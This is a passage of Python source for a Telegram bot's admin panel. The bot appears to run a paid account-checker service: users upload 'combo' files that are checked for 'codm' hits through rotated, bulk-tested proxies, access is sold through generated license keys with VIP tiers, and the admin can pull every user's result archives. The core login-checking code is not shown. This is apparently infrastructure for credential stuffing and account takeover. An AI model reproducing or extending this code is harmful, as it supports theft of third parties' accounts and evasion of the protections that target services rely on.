            with sessions_lock:
                running2=[(u2,s2) for u2,s2 in active_sessions.items() if s2.get("status")=="checking"]
            cnt2=0
            for u2,_ in running2:
                if _stop_user_session(u2,context.bot,loop2," <b>Admin stopped your session.</b>"): cnt2+=1
            await query.answer(f" Stopped {cnt2} session(s)")
            await query.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton(" Continue All",callback_data="admin_continue_all")]]))
            return

        if data=="admin_continue_all":
            cnt3=sum(1 for u3 in list(_admin_stopped) if _continue_user_session(u3,context.bot,loop2,context))
            await query.answer(f" Continued {cnt3} session(s)")
            await query.edit_message_reply_markup(reply_markup=None)
            return

        if data=="admin_continue_vip":
            cnt4=0
            for u4 in list(_admin_stopped):
                if users_db2.get(u4,{}).get("vip"):
                    if _continue_user_session(u4,context.bot,loop2,context): cnt4+=1
            await query.answer(f" Continued {cnt4} VIP session(s)")
            await query.edit_message_reply_markup(reply_markup=None)
            return

        if data=="admin_continue_nonvip":
            cnt5=0
            for u5 in list(_admin_stopped):
                if not users_db2.get(u5,{}).get("vip"):
                    if _continue_user_session(u5,context.bot,loop2,context): cnt5+=1
            await query.answer(f" Continued {cnt5} non-VIP session(s)")
            await query.edit_message_reply_markup(reply_markup=None)
            return

        if data.startswith("admin_stop_user_"):
            target2=data[len("admin_stop_user_"):]
            ok2=_stop_user_session(target2,context.bot,loop2," <b>Admin stopped your session.</b>\nYour file is safe.")
            uname2=users_db2.get(target2,{}).get("username","?")
            await query.answer(" Stopped" if ok2 else "Not running")
            if ok2:
                # Replace stop button with continue button
                new_kb=[]
                old_kb=query.message.reply_markup.inline_keyboard if query.message.reply_markup else []
                for row in old_kb:
                    new_row=[]
                    for btn in row:
                        if btn.callback_data==data:
                            new_row.append(InlineKeyboardButton(f" Continue @{uname2}",callback_data=f"admin_cont_user_{target2}"))
                        else:
                            new_row.append(btn)
                    new_kb.append(new_row)
                try: await query.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup(new_kb))
                except: pass
            return

        if data.startswith("admin_cont_user_"):
            target3=data[len("admin_cont_user_"):]
            ok3=_continue_user_session(target3,context.bot,loop2,context)
            uname3=users_db2.get(target3,{}).get("username","?")
            await query.answer(" Continued" if ok3 else "No paused session found")
            if ok3:
                new_kb2=[]
                old_kb2=query.message.reply_markup.inline_keyboard if query.message.reply_markup else []
                for row in old_kb2:
                    new_row2=[]
                    for btn in row:
                        if btn.callback_data==data:
                            new_row2.append(InlineKeyboardButton(f" Stop @{uname3}",callback_data=f"admin_stop_user_{target3}"))
                        else:
                            new_row2.append(btn)
                    new_kb2.append(new_row2)
                try: await query.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup(new_kb2))
                except: pass
            return

    # ── Proxy check inline buttons ───────────────────────────────────────
    if data.startswith("chkprx_"):
        if not is_admin(tg.id,cfg):
            await query.answer(" Admin only.",show_alert=True); return
        parts=data.split("_",2)
        action=parts[1] if len(parts)>1 else ""
        fname_cb=parts[2] if len(parts)>2 else ""
        fpath_cb=PROXY_DIR/fname_cb if fname_cb else None

        if action=="menu":
            if not fpath_cb or not fpath_cb.exists():
                await query.answer(" File not found.",show_alert=True); return
            with open(fpath_cb,"r",encoding="utf-8",errors="ignore") as f:
                total_cb=sum(1 for ln in f if ln.strip() and not ln.strip().startswith("#"))
            kb=InlineKeyboardMarkup([
                [InlineKeyboardButton(" Sample (5)",callback_data=f"chkprx_sample_{fname_cb}")],
                [InlineKeyboardButton(" Check ALL", callback_data=f"chkprx_all_{fname_cb}")],
                [InlineKeyboardButton(" Specific line…",callback_data=f"chkprx_askline_{fname_cb}")],
                [InlineKeyboardButton("« Back",callback_data="chkprx_back_")],
            ])
            await query.edit_message_text(
                f" <b>{fname_cb}</b>  ·  <code>{total_cb:,}</code> proxies\n━━━━━━━━━━━━━━━━━━━━\nChoose check mode:",
                reply_markup=kb,parse_mode=ParseMode.HTML)
            return

        if action=="back":
            pf_cb=sorted(PROXY_DIR.glob("*.txt")); btns_cb=[]
            lines_cb=[" <b>Proxy Files</b>\n━━━━━━━━━━━━━━━━━━━━"]
            for p in pf_cb:
                try:
                    with open(p,"r",encoding="utf-8",errors="ignore") as f:
                        cnt=sum(1 for ln in f if ln.strip() and not ln.strip().startswith("#"))
                    lines_cb.append(f" <code>{p.name}</code>  ·  {cnt:,} proxies")
                except: lines_cb.append(f" <code>{p.name}</code>")
                btns_cb.append([InlineKeyboardButton(f" {p.name}",callback_data=f"chkprx_menu_{p.name}")])
            await query.edit_message_text("\n".join(lines_cb),reply_markup=InlineKeyboardMarkup(btns_cb),parse_mode=ParseMode.HTML)
            return

        if action=="askline":
            if not fpath_cb or not fpath_cb.exists():
                await query.answer(" File not found.",show_alert=True); return
            with open(fpath_cb,"r",encoding="utf-8",errors="ignore") as f:
                total_cb2=sum(1 for ln in f if ln.strip() and not ln.strip().startswith("#"))
            with sessions_lock:
                active_sessions.setdefault(uid,{})
                active_sessions[uid]["awaiting_proxy_line"]=fname_cb
                active_sessions[uid]["awaiting_proxy_line_total"]=total_cb2
            await query.edit_message_text(
                f" <b>Enter Line Number</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                f"File: <code>{fname_cb}</code>  ·  <code>{total_cb2:,}</code> proxies\n"
                f"Send a number (1–{total_cb2:,}) to check that proxy line.",
                parse_mode=ParseMode.HTML)
            return

        if action=="rmdeadlines":
            # Remove dead+error lines from ONE file (re-test to be sure)
            if not fpath_cb or not fpath_cb.exists():
                await query.answer(" File not found.",show_alert=True); return
            await query.answer(" Removing dead & error lines…")
            await query.edit_message_text(
                f" <b>Cleaning <code>{fname_cb}</code>…</b>\nRe-testing all proxies, please wait.",
                parse_mode=ParseMode.HTML)
            with open(fpath_cb,"r",encoding="utf-8",errors="ignore") as f:
                proxy_lines_cb=[ln.strip() for ln in f if ln.strip() and not ln.strip().startswith("#")]
            from concurrent.futures import ThreadPoolExecutor as _TPED,as_completed as _ascd
            rm_map={}
            with _TPED(max_workers=20) as ex2:
                futs2={ex2.submit(_test_proxy_sync,ln):i for i,ln in enumerate(proxy_lines_cb)}
                for fut2 in _ascd(futs2):
                    i2=futs2[fut2]
                    try: ok2,_=fut2.result(); rm_map[i2]=ok2
                    except: rm_map[i2]=False
            working_cb=[proxy_lines_cb[i] for i,ok in sorted(rm_map.items()) if ok]
            dead_cb_n=len(proxy_lines_cb)-len(working_cb)
            if not working_cb:
                await query.edit_message_text(
                    f" <b>All proxies dead/error</b>\n<code>{fname_cb}</code> kept unchanged.\nUse /removeproxy to delete it.",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("« Back",callback_data=f"chkprx_menu_{fname_cb}")]]),
                    parse_mode=ParseMode.HTML); return
            with open(fpath_cb,"w",encoding="utf-8") as f:
                for ln in working_cb: f.write(ln+"\n")
            await query.edit_message_text(
                f" <b>Dead & Error Lines Removed!</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                f" <code>{fname_cb}</code>\n"
                f" Kept    : <code>{len(working_cb):,}</code> working\n"
                f" Removed : <code>{dead_cb_n:,}</code> dead/error lines",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("« Back",callback_data=f"chkprx_menu_{fname_cb}")]]),
                parse_mode=ParseMode.HTML)
            return

        if action=="rmdeadlines_ALL":
            # ── Remove dead+error lines from ALL proxy files at once ───────
            if not is_admin(tg.id,cfg):
                await query.answer(" Admin only.",show_alert=True); return
            all_pf=sorted(PROXY_DIR.glob("*.txt"))
            if not all_pf:
                await query.answer(" No proxy files.",show_alert=True); return
            await query.edit_message_text(
                f" <b>Cleaning ALL {len(all_pf)} proxy file(s)…</b>\nTesting every line, please wait.",
                parse_mode=ParseMode.HTML)
            from concurrent.futures import ThreadPoolExecutor as _TPEALL,as_completed as _ascALL
            total_removed=0; total_kept=0; file_lines=[]
            for pf_all in all_pf:
                try:
                    with open(pf_all,"r",encoding="utf-8",errors="ignore") as f:
                        lines_all=[ln.strip() for ln in f if ln.strip() and not ln.strip().startswith("#")]
                    if not lines_all:
                        file_lines.append(f" <code>{pf_all.name}</code> — empty, skipped")
                        continue
                    rm_map2={}
                    with _TPEALL(max_workers=20) as ex3:
                        futs3={ex3.submit(_test_proxy_sync,ln):i for i,ln in enumerate(lines_all)}
                        for fut3 in _ascALL(futs3):
                            i3=futs3[fut3]
                            try: ok3,_=fut3.result(); rm_map2[i3]=ok3
                            except: rm_map2[i3]=False
                    working3=[lines_all[i] for i,ok in sorted(rm_map2.items()) if ok]
                    removed3=len(lines_all)-len(working3)
                    total_removed+=removed3; total_kept+=len(working3)
                    if working3:
                        with open(pf_all,"w",encoding="utf-8") as f:
                            for ln in working3: f.write(ln+"\n")
                        file_lines.append(f" <code>{pf_all.name}</code>  kept:{len(working3):,}  removed:{removed3:,}")
                    else:
                        file_lines.append(f" <code>{pf_all.name}</code>  all dead — file kept unchanged")
                except Exception as e:
                    file_lines.append(f" <code>{pf_all.name}</code>  error: {e}")
            summary=("\n".join(file_lines))
            await query.edit_message_text(
                f" <b>All Files Cleaned!</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                f" Total removed : <code>{total_removed:,}</code> dead/error lines\n"
                f" Total kept    : <code>{total_kept:,}</code> working\n"
                f"━━━━━━━━━━━━━━━━━━━━\n{summary}",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("« Back to Proxy",callback_data="adm_proxy")]]),
                parse_mode=ParseMode.HTML)
            return

        if action in ("sample","all"):
            if not fpath_cb or not fpath_cb.exists():
                await query.answer(" File not found.",show_alert=True); return
            await query.answer(" Checking…")
            from concurrent.futures import ThreadPoolExecutor as _TPECB, as_completed as _ASCCB

            with open(fpath_cb,"r",encoding="utf-8",errors="ignore") as f:
                all_cb=[ln.strip() for ln in f if ln.strip() and not ln.strip().startswith("#")]
            total_cb=len(all_cb)

            if action=="sample":
                idx_s=[0,total_cb//4,total_cb//2,3*total_cb//4,total_cb-1]
                sample=[all_cb[i] for i in dict.fromkeys(idx_s) if i<total_cb][:5]
                res_s=[]
                lp=asyncio.get_event_loop()
                for ln in sample:
                    ok_s,err_s=await lp.run_in_executor(None,_test_proxy_sync,ln)
                    label=f"" if ok_s else f" ({err_s})" if err_s else ""
                    res_s.append(f"{label} Line {all_cb.index(ln)+1}: <code>{ln[:50]}</code>")
                wk=sum(1 for r in res_s if r.startswith(""))
                out_s=(f"{'' if wk==len(sample) else ('' if wk>0 else '')} <b>{fname_cb}</b> — {wk}/{len(sample)} working\n"
                       f"━━━━━━━━━━━━━━━━━━━━\n"+"\n".join(res_s))
                if wk==0: out_s+="\n━━━━━━━━━━━━━━━━━━━━\n All sampled dead/error. Use Check ALL to verify."
                kb_s=InlineKeyboardMarkup([[InlineKeyboardButton("« Back",callback_data=f"chkprx_menu_{fname_cb}")]])
                try: await query.edit_message_text(out_s,reply_markup=kb_s,parse_mode=ParseMode.HTML)
                except: pass

            else:  # all
                await query.edit_message_text(
                    f" Checking ALL <code>{total_cb:,}</code> proxies from <code>{fname_cb}</code>…\nThis may take a while.",
                    parse_mode=ParseMode.HTML)
                res_map={}
                def _ci_cb(il):
                    i,ln=il; ok_r,err_r=_test_proxy_sync(ln); return i,ln,ok_r,err_r
                with _TPECB(max_workers=20) as ex:
                    futs={ex.submit(_ci_cb,(i,ln)):i for i,ln in enumerate(all_cb,1)}
                    for fut in _ASCCB(futs):
                        try:
                            i,ln,ok_r,err_r=fut.result(); res_map[i]=(ln,ok_r,err_r)
                        except: pass
                working_a=[(i,ln) for i,(ln,ok_r,_) in sorted(res_map.items()) if ok_r]
                dead_a   =[(i,ln,err_r) for i,(ln,ok_r,err_r) in sorted(res_map.items()) if not ok_r]
                tok=len(working_a); pct=int(tok/total_cb*100) if total_cb else 0
                out_lines=[
                    f"{'' if pct>=80 else ''} <b>{fname_cb}</b> — {tok}/{total_cb} working ({pct}%)",
                    f"━━━━━━━━━━━━━━━━━━━━",
                    f" Working : <code>{tok:,}</code>",
                    f" Dead/Error : <code>{len(dead_a):,}</code>",
                ]
                if dead_a:
                    # Group errors by type
                    from collections import Counter as _Ctr
                    err_ctr=_Ctr(err_r for _,_,err_r in dead_a if err_r)
                    if err_ctr:
                        err_summary=", ".join(f"{v}x {k}" for k,v in err_ctr.most_common(4))
                        out_lines.append(f" Errors: {err_summary}")
                    out_lines.append("━━━━━━━━━━━━━━━━━━━━")
                    dp="\n".join(f"   Line {i}: <code>{ln[:45]}</code> — {err_r}" for i,ln,err_r in dead_a[:15])
                    if len(dead_a)>15: dp+=f"\n  … and {len(dead_a)-15} more dead/error lines"
                    out_lines+=["<b>Dead / Error proxies:</b>",dp,"━━━━━━━━━━━━━━━━━━━━"]
                    kb_a=InlineKeyboardMarkup([
                        [InlineKeyboardButton(f" Remove {len(dead_a):,} dead/error lines (this file)",
                                             callback_data=f"chkprx_rmdeadlines_{fname_cb}")],
                        [InlineKeyboardButton(f" Remove dead/error from ALL files",
                                             callback_data="chkprx_rmdeadlines_ALL_")],
                        [InlineKeyboardButton("« Back",callback_data=f"chkprx_menu_{fname_cb}")],
                    ])
                else:
                    kb_a=InlineKeyboardMarkup([[InlineKeyboardButton("« Back",callback_data=f"chkprx_menu_{fname_cb}")]])
                full="\n".join(out_lines)
                if len(full)>4000: full=full[:4000]+"…"
                try: await query.edit_message_text(full,reply_markup=kb_a,parse_mode=ParseMode.HTML)
                except: pass
            return
        return

    # ── Open admin panel from /start button ─────────────────────────────
    if data=="open_admin_panel":
        if not is_admin(tg.id,cfg):
            await query.answer(" Admin only.",show_alert=True); return
        cfg2=load_config(); users2=load_users()
        await query.edit_message_text(
            _admin_status_text(cfg2, users2),
            reply_markup=_admin_main_kb(cfg2),
            parse_mode=ParseMode.HTML)
        return

    # ── Admin sub-menu callbacks ──────────────────────────────────────────
    if data.startswith("adm_"):
        if not is_admin(tg.id,cfg):
            await query.answer(" Admin only.",show_alert=True); return

        BACK = [[InlineKeyboardButton("« Back",callback_data="adm_back")]]

        # ── Back to main menu ─────────────────────────────────────────────
        if data=="adm_back":
            cfg2=load_config(); users2=load_users()
            await query.edit_message_text(
                _admin_status_text(cfg2, users2),
                reply_markup=_admin_main_kb(cfg2),
                parse_mode=ParseMode.HTML)
            return

        # ── Toggle lock ───────────────────────────────────────────────────
        if data=="adm_toggle_lock":
            cfg2=load_config()
            cfg2["locked"]=not cfg2.get("locked",False); save_config(cfg2)
            users2=load_users()
            if cfg2["locked"]:
                with sessions_lock:
                    for uid2,s2 in active_sessions.items():
                        if s2.get("status")=="checking" and not users2.get(uid2,{}).get("vip"):
                            s2["stop_event"].set()
            await query.answer(" Locked!" if cfg2["locked"] else " Unlocked!")
            await query.edit_message_text(
                _admin_status_text(cfg2, users2),
                reply_markup=_admin_main_kb(cfg2),
                parse_mode=ParseMode.HTML)
            return

        # ── Refresh panel ─────────────────────────────────────────────────
        if data=="adm_refresh":
            cfg2=load_config()
            saved_mc=cfg2.get("max_concurrent",5)
            if saved_mc!=MAX_CONCURRENT_CHECKERS: rebuild_semaphore(saved_mc)
            try:
                geo_rotator.__init__()
            except: pass
            users2=load_users()
            await query.answer(" Refreshed!")
            await query.edit_message_text(
                _admin_status_text(cfg2, users2),
                reply_markup=_admin_main_kb(cfg2),
                parse_mode=ParseMode.HTML)
            return

        # ── Stats ─────────────────────────────────────────────────────────
        if data=="adm_stats":
            cfg2=load_config(); users2=load_users(); keys2=load_keys()
            tu=len(users2); au=sum(1 for u in users2.values() if u.get("activated"))
            bu=sum(1 for u in users2.values() if u.get("banned"))
            vu=sum(1 for u in users2.values() if u.get("vip"))
            tc=sum(u.get("total_checked",0) for u in users2.values())
            with sessions_lock: live2=sum(1 for s in active_sessions.values() if s.get("status")=="checking")
            pf2=list(PROXY_DIR.glob("*.txt")); tp2=0
            for pf3 in pf2:
                try:
                    with open(pf3,"r",encoding="utf-8",errors="ignore") as fh:
                        tp2+=sum(1 for ln in fh if ln.strip() and not ln.strip().startswith("#"))
                except: pass
            await query.edit_message_text(
                f" <b>Statistics</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                f" Total Users   : <code>{tu}</code>\n"
                f" Activated     : <code>{au}</code>\n"
                f" Banned        : <code>{bu}</code>\n"
                f" VIP           : <code>{vu}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f" Running       : <code>{live2}/{MAX_CONCURRENT_CHECKERS}</code>\n"
                f" Total checked : <code>{tc:,}</code>\n"
                f" Keys total    : <code>{len(keys2)}</code>\n"
                f" Keys used     : <code>{sum(1 for k in keys2.values() if k.get('used_by'))}</code>\n"
                f" Proxies       : <code>{tp2:,}</code> in <code>{len(pf2)}</code> file(s)\n"
                f" Locked        : <code>{'YES ' if cfg2.get('locked') else 'No '}</code>",
                reply_markup=InlineKeyboardMarkup(BACK), parse_mode=ParseMode.HTML)
            return

        # ── Running sessions ──────────────────────────────────────────────
        if data=="adm_running":
            with sessions_lock:
                running2=[(u2,s2) for u2,s2 in active_sessions.items() if s2.get("status")=="checking"]
            users2=load_users()
            if not running2:
                await query.edit_message_text(
                    " <b>No active sessions</b>",
                    reply_markup=InlineKeyboardMarkup(BACK), parse_mode=ParseMode.HTML)
                return
            lines2=[f" <b>Running ({len(running2)})</b>\n━━━━━━━━━━━━━━━━━━━━"]
            for u2,s2 in running2:
                ud2=users2.get(u2,{}); fn2=ud2.get("first_name","?"); un2=ud2.get("username","?")
                combo2=Path(s2.get("file","")).name if s2.get("file") else "N/A"
                ls3=s2.get("live_stats"); st3=ls3.get_stats() if ls3 else {}
                orig2=s2.get("orig_total",0)
                try:
                    with open(s2["file"],"r",encoding="utf-8",errors="ignore") as _f2:
                        rem2=sum(1 for ln in _f2 if ln.strip() and not ln.strip().startswith("==="))
                except: rem2=0
                done2=max(0,orig2-rem2) if orig2 else 0
                pct2=int(done2/orig2*100) if orig2 else 0
                lines2.append(f"\n <b>{fn2}</b> @{un2}\n {combo2}\n"
                              f" {done2}/{orig2} ({pct2}%)   {st3.get('has_codm',0)} hits")
            await query.edit_message_text(
                "\n".join(lines2),
                reply_markup=InlineKeyboardMarkup(BACK), parse_mode=ParseMode.HTML)
            return

        # ── Keys sub-menu ─────────────────────────────────────────────────
        if data=="adm_keys":
            await _adm_edit(query,
                " <b>Keys</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                "Tap to generate a key or remove keys.",
                _admin_keys_kb())
            return

        if data.startswith("adm_genkey_"):
            parts3=data.split("_"); dtype3=parts3[2]; dval3=int(parts3[3]); mu3=int(parts3[4])
            exp3=compute_expiry(dtype3,dval3)
            import uuid as _uuid
            key3=f"MITZ-{_uuid.uuid4().hex[:8].upper()}-{_uuid.uuid4().hex[:4].upper()}"
            dd3={"hours":f"{dval3}h","days":f"{dval3}d","months":f"{dval3}mo","lifetime":"Lifetime"}[dtype3]
            keys3=load_keys()
            keys3[key3]={"max_users":mu3,"used_by":[],"duration_type":dtype3,"duration_val":dval3,
                         "expires_at":exp3,"created_at":datetime.now().isoformat(),"created_by":tg.id}
            save_keys(keys3)
            await query.answer(" Key generated!")
            await query.edit_message_text(
                f" <b>Key Generated!</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                f"<code>{key3}</code>\n━━━━━━━━━━━━━━━━━━━━\n"
                f" Duration : <b>{dd3}</b>\n"
                f" Expires  : {fmt_expiry(exp3)}\n"
                f" Max users: <code>{mu3}</code>",
                reply_markup=InlineKeyboardMarkup(BACK), parse_mode=ParseMode.HTML)
            return

        if data=="adm_removekey_info":
            await query.answer("/remove_key <id> | all | vip | nonvip", show_alert=True)
            return

        # ── Users sub-menu ────────────────────────────────────────────────
        if data=="adm_users":
            await _adm_edit(query,
                " <b>Users</b>\n━━━━━━━━━━━━━━━━━━━━\nManage users:",
                _admin_users_kb())
            return

        if data in ("adm_info_addvip","adm_info_removevip","adm_info_ban","adm_info_unban","adm_info_broadcast"):
            cmd_hints={"adm_info_addvip":"/addvip <id>","adm_info_removevip":"/removevip <id>",
                       "adm_info_ban":"/ban_user <id>","adm_info_unban":"/unban_user <id>",
                       "adm_info_broadcast":"/broadcast <message>"}
            await query.answer(cmd_hints.get(data,""), show_alert=True)
            return

        if data.startswith("adm_rk_"):
            mode3=data[7:]
            users3=load_users(); cnt3=0
            for uid3 in list(users3.keys()):
                u3=users3[uid3]; iv3=u3.get("vip",False); ia3=u3.get("activated",False)
                match3=(mode3=="all" and ia3) or (mode3=="vip" and ia3 and iv3) or (mode3=="nonvip" and ia3 and not iv3)
                if match3:
                    users3[uid3].update({"activated":False,"key_used":None,"key_expires_at":None,"key_expired":False}); cnt3+=1
                    with sessions_lock:
                        if uid3 in active_sessions: active_sessions[uid3].get("stop_event",threading.Event()).set()
                    try: await context.bot.send_message(chat_id=int(uid3),text=" <b>Access Revoked</b>\n\nYour key was removed by admin.",parse_mode=ParseMode.HTML)
                    except: pass
            save_users(users3)
            label3={"all":"All","vip":"VIP","nonvip":"Non-VIP"}[mode3]
            await query.answer(f" Removed {cnt3} keys")
            await query.edit_message_text(
                f" <b>Keys Removed ({label3})</b>\n<code>{cnt3}</code> user(s) revoked.",
                reply_markup=InlineKeyboardMarkup(BACK), parse_mode=ParseMode.HTML)
            return

        if data=="adm_allusers":
            users3=load_users()
            ac3=sum(1 for u in users3.values() if u.get("activated"))
            bc3=sum(1 for u in users3.values() if u.get("banned"))
            vc3=sum(1 for u in users3.values() if u.get("vip"))
            lines3=[f" <b>Users ({len(users3)})</b>  {ac3}  {bc3}  {vc3}\n━━━━━━━━━━━━━━━━━━━━"]
            for uid3,u3 in sorted(users3.items(),key=lambda x:x[1].get("joined",""),reverse=True):
                st3="" if u3.get("banned") else ("" if u3.get("vip") else ("" if u3.get("activated") else ""))
                lines3.append(f"{st3} <code>{uid3}</code> @{u3.get('username','?')}  {u3.get('total_checked',0):,} checked")
            msg3="\n".join(lines3)
            for chunk in [msg3[i:i+4000] for i in range(0,len(msg3),4000)]:
                await context.bot.send_message(chat_id=query.message.chat_id,text=chunk,parse_mode=ParseMode.HTML)
            return

        # ── Proxy sub-menu ────────────────────────────────────────────────
        if data=="adm_proxy":
            pf4=sorted(PROXY_DIR.glob("*.txt")); tp4=0
            for pf5 in pf4:
                try:
                    with open(pf5,"r",encoding="utf-8",errors="ignore") as fh:
                        tp4+=sum(1 for ln in fh if ln.strip() and not ln.strip().startswith("#"))
                except: pass
            await _adm_edit(query,
                f" <b>Proxy</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                f"Files: <code>{len(pf4)}</code>  ·  Proxies: <code>{tp4:,}</code>",
                _admin_proxy_kb())
            return

        if data=="adm_proxy_upload":
            await query.answer("/upload_proxy — send a .txt file after", show_alert=True)
            uid5=str(tg.id)
            with sessions_lock: active_sessions.setdefault(uid5,{}); active_sessions[uid5]["awaiting_proxy"]=True
            await context.bot.send_message(chat_id=query.message.chat_id,
                text=" <b>Upload Proxy File</b>\nSend your <code>.txt</code> proxy file now.",
                parse_mode=ParseMode.HTML)
            return

        if data=="adm_proxy_paste":
            uid5=str(tg.id)
            with sessions_lock: active_sessions.setdefault(uid5,{}); active_sessions[uid5]["awaiting_proxy_paste"]=True
            await query.edit_message_text(
                " <b>Paste Proxies</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                "Paste your proxy lines now (one per line).\n<code>host:port</code> or <code>host:port:user:pass</code>",
                reply_markup=InlineKeyboardMarkup(BACK), parse_mode=ParseMode.HTML)
            return

        if data=="adm_proxy_status":
            pf6=sorted(PROXY_DIR.glob("*.txt"))
            if not pf6:
                await query.edit_message_text(" No proxy files.",reply_markup=InlineKeyboardMarkup(BACK),parse_mode=ParseMode.HTML); return
            lines6=[" <b>Proxy Files</b>\n━━━━━━━━━━━━━━━━━━━━"]
            tot6=0
            for p6 in pf6:
                try:
                    with open(p6,"r",encoding="utf-8",errors="ignore") as f6:
                        cnt6=sum(1 for ln in f6 if ln.strip() and not ln.strip().startswith("#"))
                    sz6=p6.stat().st_size; ss6=f"{sz6/1024:.1f}KB" if sz6<1024*1024 else f"{sz6/1024/1024:.1f}MB"
                    tot6+=cnt6; lines6.append(f" <code>{p6.name}</code>  {cnt6:,}  {ss6}")
                except: lines6.append(f" <code>{p6.name}</code>  ")
            lines6.append(f"━━━━━━━━━━━━━━━━━━━━\n Total: <code>{tot6:,}</code>")
            await query.edit_message_text("\n".join(lines6),reply_markup=InlineKeyboardMarkup(BACK),parse_mode=ParseMode.HTML)
            return

        if data=="adm_proxy_remove":
            pf7=sorted(PROXY_DIR.glob("*.txt"))
            if not pf7:
                await query.edit_message_text(" No proxy files.",reply_markup=InlineKeyboardMarkup(BACK),parse_mode=ParseMode.HTML); return
            btns7=[[InlineKeyboardButton(f" {p7.name}",callback_data=f"delproxy_{p7.name}")] for p7 in pf7]
            btns7.append([InlineKeyboardButton(" Delete ALL",callback_data="delproxy_ALL")])
            btns7+=BACK
            await query.edit_message_text(" Tap file to delete:",reply_markup=InlineKeyboardMarkup(btns7),parse_mode=ParseMode.HTML)
            return

        # ── Settings sub-menu ─────────────────────────────────────────────
        if data=="adm_settings":
            cfg5=load_config()
            await _adm_edit(query,
                f" <b>Settings</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                f" Threads    : <code>{cfg5.get('default_threads',5)}</code>\n"
                f" Concurrent : <code>{cfg5.get('max_concurrent',5)}</code>\n"
                f" Limit      : <code>{cfg5.get('global_limit') or 'Unlimited'}</code>\n"
                f" VIP Limit  : <code>{cfg5.get('vip_limit') or 'Unlimited'}</code>\n"
                f" Cooldown   : <code>{'Off' if not cfg5.get('cooldown_sessions') else str(cfg5['cooldown_sessions'])+'s→'+str(cfg5.get('cooldown_minutes',30))+'m'}</code>",
                _admin_settings_kb(cfg5))
            return

        if data in ("adm_info_threads","adm_info_cd","adm_info_limit","adm_info_viplimit","adm_info_concurrent"):
            hints={"adm_info_threads":"/setthreads <n>  (default threads per checker)",
                   "adm_info_cd":"/setcd <sessions> <minutes>  or  /setcd off",
                   "adm_info_limit":"/setlimit <n>  or  /setlimit off",
                   "adm_info_viplimit":"/setlimitforvip <n>  or  /setlimitforvip off",
                   "adm_info_concurrent":"/setconcurrent <n>  (1-50)"}
            await query.answer(hints.get(data,""), show_alert=True)
            return

        # ── Files sub-menu ────────────────────────────────────────────────
        if data=="adm_files":
            await _adm_edit(query,
                " <b>Files & Results</b>\n━━━━━━━━━━━━━━━━━━━━\nChoose action:",
                _admin_files_kb())
            return

        if data=="adm_files_clearcombo":
            count8=0
            for uid_dir8 in list(COMBO_DIR.iterdir()):
                if uid_dir8.is_dir():
                    for f8 in uid_dir8.glob("*.txt"):
                        try: f8.unlink(); count8+=1
                        except: pass
                    uid8=uid_dir8.name; clear_persisted_session(uid8)
                    with sessions_lock:
                        if uid8 in active_sessions and active_sessions[uid8].get("status") not in ("checking",):
                            del active_sessions[uid8]
                    # Remove uid subfolder if now empty
                    try:
                        if uid_dir8.exists() and not any(uid_dir8.iterdir()):
                            uid_dir8.rmdir()
                    except: pass
            await query.answer(f" Deleted {count8} combo file(s)")
            await query.edit_message_text(f" <b>Combo Cleared</b>\nDeleted <code>{count8}</code> file(s).",
                reply_markup=InlineKeyboardMarkup(BACK), parse_mode=ParseMode.HTML)
            return

        if data=="adm_files_clearresults":
            import shutil; dirs8=0
            for uid_dir8 in RESULTS_DIR.iterdir():
                if uid_dir8.is_dir():
                    try: shutil.rmtree(uid_dir8); dirs8+=1
                    except: pass
            await query.answer(f" Cleared {dirs8} user(s) results")
            await query.edit_message_text(f" <b>Results Cleared</b>\nDeleted results for <code>{dirs8}</code> user(s).",
                reply_markup=InlineKeyboardMarkup(BACK), parse_mode=ParseMode.HTML)
            return

        if data=="adm_files_sendall":
            await query.answer(" Sending all results…")
            dirs9=[d for d in RESULTS_DIR.iterdir() if d.is_dir()]
            if not dirs9:
                await context.bot.send_message(chat_id=query.message.chat_id,text=" No results found."); return
            users9=load_users()
            for uid_dir9 in sorted(dirs9,key=lambda x:x.name):
                zips9=sorted(uid_dir9.rglob("*.zip"),key=lambda x:x.stat().st_mtime,reverse=True)
                if not zips9: continue
                uname9=users9.get(uid_dir9.name,{}).get("username","?")
                try:
                    with open(zips9[0],"rb") as f9:
                        await context.bot.send_document(chat_id=query.message.chat_id,document=f9,
                            filename=zips9[0].name,caption=f" {uid_dir9.name} @{uname9}")
                except: pass
            return

        # ── Keys helper callbacks ─────────────────────────────────────────
        if data in ("adm_genkey_hours","adm_genkey_days","adm_genkey_months","adm_genkey_lifetime"):
            dtype=data.split("_")[2]
            defaults={"hours":(24,1),"days":(7,1),"months":(1,1),"lifetime":(0,1)}
            dval,mu=defaults[dtype]
            exp=compute_expiry(dtype,dval)
            import uuid as _uuid2
            key=f"MITZ-{_uuid2.uuid4().hex[:8].upper()}-{_uuid2.uuid4().hex[:4].upper()}"
            dd={"hours":f"{dval}h","days":f"{dval}d","months":f"{dval}mo","lifetime":"Lifetime"}[dtype]
            keys_db=load_keys()
            keys_db[key]={"max_users":mu,"used_by":[],"duration_type":dtype,"duration_val":dval,
                          "expires_at":exp,"created_at":datetime.now().isoformat(),"created_by":tg.id}
            save_keys(keys_db)
            await query.answer(" Key generated!")
            await _adm_edit(query,
                f" <b>Key Generated!</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                f"<code>{key}</code>\n━━━━━━━━━━━━━━━━━━━━\n"
                f" Duration : <b>{dd}</b>\n"
                f" Expires  : {fmt_expiry(exp)}\n"
                f" Max users: <code>{mu}</code>",
                InlineKeyboardMarkup([[InlineKeyboardButton("« Back",callback_data="adm_keys")]]))
            return

        if data in ("adm_rmkey_all","adm_rmkey_vip","adm_rmkey_nonvip"):
            mode=data.split("_")[2]
            users_db2=load_users(); cnt=0
            for uid2 in list(users_db2.keys()):
